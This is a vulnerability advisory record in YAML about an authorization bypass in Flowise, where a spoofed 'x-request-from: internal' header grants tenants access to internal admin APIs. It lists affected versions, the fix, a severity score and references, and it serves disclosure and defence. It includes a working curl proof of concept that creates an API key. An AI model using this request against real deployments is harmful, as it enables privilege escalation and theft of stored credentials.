@@ -1,0 +1,191 @@
+advisory_id: GHSA-wvhq-wp8g-c7vq
+datasource_id: github_osv/GHSA-wvhq-wp8g-c7vq
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-wvhq-wp8g-c7vq/GHSA-wvhq-wp8g-c7vq.json
+aliases:
+  - CVE-2026-30820
+summary: |
+  Flowise has Authorization Bypass via Spoofed x-request-from Header
+  ### Summary
+
+  Flowise trusts any HTTP client that sets the header `x-request-from: internal`, allowing an authenticated tenant session to bypass all `/api/v1/**` authorization checks. With only a browser cookie, a low-privilege tenant can invoke internal administration endpoints (API key management, credential stores, custom function execution, etc.), effectively escalating privileges.
+
+  ### Details
+
+  The global middleware that guards `/api/v1` routes lives in `external/Flowise/packages/server/src/index.ts:214`. After filtering out the whitelist, the logic short-circuits on the spoofable header:
+
+  ```javascript
+  if (isWhitelisted) {
+      next();
+  } else if (req.headers['x-request-from'] === 'internal') {
+      verifyToken(req, res, next);
+  } else {
+      const { isValid } = await validateAPIKey(req);
+      if (!isValid) return res.status(401).json({ error: 'Unauthorized Access' });
+      … // owner context stitched from API key
+  }
+  ```
+
+  Because the middle branch blindly calls verifyToken, any tenant that already has a UI session cookie is treated as an internal client simply by adding that header. No additional permission checks are performed before `next()` executes, so every downstream router under `/api/v1` becomes reachable.
+
+  ### PoC
+
+  1. Log into Flowise 3.0.8 and capture cookies (e.g., `curl -c /tmp/flowise_cookies.txt … /api/v1/auth/login`).
+  2. Invoke an internal-only endpoint with the spoofed header:
+
+  ```bash
+      curl -sS -b /tmp/flowise_cookies.txt \
+        -H 'Content-Type: application/json' \
+        -H 'x-request-from: internal' \
+        -X POST http://127.0.0.1:3100/api/v1/apikey \
+        -d '{"keyName":"Bypass Demo"}'
+  ```
+      The server returns HTTP 200 and the newly created key object.
+  3. Remove the header and retry:
+
+  ```bash
+      curl -sS -b /tmp/flowise_cookies.txt \
+        -H 'Content-Type: application/json' \
+        -X POST http://127.0.0.1:3100/api/v1/apikey \
+        -d '{"keyName":"Bypass Demo"}'
+  ```
+      This yields {"error":"Unauthorized Access"}, confirming the header alone controls access.
+
+  The same spoof grants access to other privileged routes like `/api/v1/credentials`, `/api/v1/tools`, `/api/v1/node-custom-function`, etc.
+
+  ### Impact
+
+  This is an authorization bypass / privilege escalation. Any authenticated tenant (even without API keys or elevated roles) can execute internal administration APIs solely from the browser, enabling actions such as minting new API keys, harvesting stored secrets, and, when combined with other flaws (e.g., Custom Function RCE), full system compromise. All self-hosted Flowise 3.0.8 deployments that rely on the default middleware are affected.
+impacted_packages:
+  - purl: pkg:npm/flowise
+    affected_versions: vers:npm/<=3.0.12
+    fixed_versions: vers:npm/3.0.13
+    affected_packages:
+      - pkg:npm/flowise@1.0.0
+      - pkg:npm/flowise@1.0.1
+      - pkg:npm/flowise@1.1.0
+      - pkg:npm/flowise@1.1.1
+      - pkg:npm/flowise@1.2.1
+      - pkg:npm/flowise@1.2.2
+      - pkg:npm/flowise@1.2.3
+      - pkg:npm/flowise@1.2.4
+      - pkg:npm/flowise@1.2.5
+      - pkg:npm/flowise@1.2.6
+      - pkg:npm/flowise@1.2.7
+      - pkg:npm/flowise@1.2.8
+      - pkg:npm/flowise@1.2.9
+      - pkg:npm/flowise@1.2.10
+      - pkg:npm/flowise@1.2.11
+      - pkg:npm/flowise@1.2.12
+      - pkg:npm/flowise@1.2.13
+      - pkg:npm/flowise@1.2.14
+      - pkg:npm/flowise@1.2.15
+      - pkg:npm/flowise@1.2.16
+      - pkg:npm/flowise@1.3.0
+      - pkg:npm/flowise@1.3.1
+      - pkg:npm/flowise@1.3.2
+      - pkg:npm/flowise@1.3.3
+      - pkg:npm/flowise@1.3.4
+      - pkg:npm/flowise@1.3.5
+      - pkg:npm/flowise@1.3.6
+      - pkg:npm/flowise@1.3.7
+      - pkg:npm/flowise@1.3.8-rc.1
+      - pkg:npm/flowise@1.3.8
+      - pkg:npm/flowise@1.3.9
+      - pkg:npm/flowise@1.4.0-rc.1
+      - pkg:npm/flowise@1.4.0
+      - pkg:npm/flowise@1.4.1
+      - pkg:npm/flowise@1.4.2
+      - pkg:npm/flowise@1.4.3
+      - pkg:npm/flowise@1.4.4
+      - pkg:npm/flowise@1.4.5
+      - pkg:npm/flowise@1.4.6
+      - pkg:npm/flowise@1.4.7
+      - pkg:npm/flowise@1.4.8
+      - pkg:npm/flowise@1.4.9
+      - pkg:npm/flowise@1.4.10
+      - pkg:npm/flowise@1.4.11
+      - pkg:npm/flowise@1.4.12
+      - pkg:npm/flowise@1.5.0
+      - pkg:npm/flowise@1.5.1
+      - pkg:npm/flowise@1.6.0
+      - pkg:npm/flowise@1.6.1
+      - pkg:npm/flowise@1.6.2
+      - pkg:npm/flowise@1.6.3
+      - pkg:npm/flowise@1.6.4
+      - pkg:npm/flowise@1.6.5
+      - pkg:npm/flowise@1.6.6
+      - pkg:npm/flowise@1.7.1
+      - pkg:npm/flowise@1.7.2
+      - pkg:npm/flowise@1.8.0
+      - pkg:npm/flowise@1.8.1
+      - pkg:npm/flowise@1.8.2
+      - pkg:npm/flowise@1.8.3
+      - pkg:npm/flowise@1.8.4
+      - pkg:npm/flowise@2.0.0
+      - pkg:npm/flowise@2.0.1
+      - pkg:npm/flowise@2.0.2
+      - pkg:npm/flowise@2.0.3
+      - pkg:npm/flowise@2.0.4
+      - pkg:npm/flowise@2.0.5
+      - pkg:npm/flowise@2.0.6
+      - pkg:npm/flowise@2.0.7
+      - pkg:npm/flowise@2.1.0
+      - pkg:npm/flowise@2.1.1
+      - pkg:npm/flowise@2.1.2
+      - pkg:npm/flowise@2.1.3
+      - pkg:npm/flowise@2.1.4
+      - pkg:npm/flowise@2.1.5
+      - pkg:npm/flowise@2.2.0
+      - pkg:npm/flowise@2.2.1
+      - pkg:npm/flowise@2.2.2
+      - pkg:npm/flowise@2.2.3
+      - pkg:npm/flowise@2.2.4
+      - pkg:npm/flowise@2.2.5
+      - pkg:npm/flowise@2.2.6-hotfix.1
+      - pkg:npm/flowise@2.2.6
+      - pkg:npm/flowise@2.2.7-patch.1
+      - pkg:npm/flowise@2.2.7
+      - pkg:npm/flowise@2.2.8
+      - pkg:npm/flowise@3.0.0
+      - pkg:npm/flowise@3.0.1
+      - pkg:npm/flowise@3.0.2
+      - pkg:npm/flowise@3.0.3
+      - pkg:npm/flowise@3.0.4
+      - pkg:npm/flowise@3.0.5
+      - pkg:npm/flowise@3.0.6
+      - pkg:npm/flowise@3.0.7
+      - pkg:npm/flowise@3.0.8
+      - pkg:npm/flowise@3.0.10
+      - pkg:npm/flowise@3.0.11
+      - pkg:npm/flowise@3.0.12
+    fixed_packages:
+      - pkg:npm/flowise@3.0.13
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '8.7'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-wvhq-wp8g-c7vq/GHSA-wvhq-wp8g-c7vq.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-863
+references:
+  - url: https://github.com/FlowiseAI/Flowise
+    reference_type:
+    reference_id:
+  - url: https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.0.13
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-30820
+    reference_type:
+    reference_id: CVE-2026-30820
+  - url: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wvhq-wp8g-c7vq
+    reference_type:
+    reference_id: GHSA-wvhq-wp8g-c7vq
+exploits: []
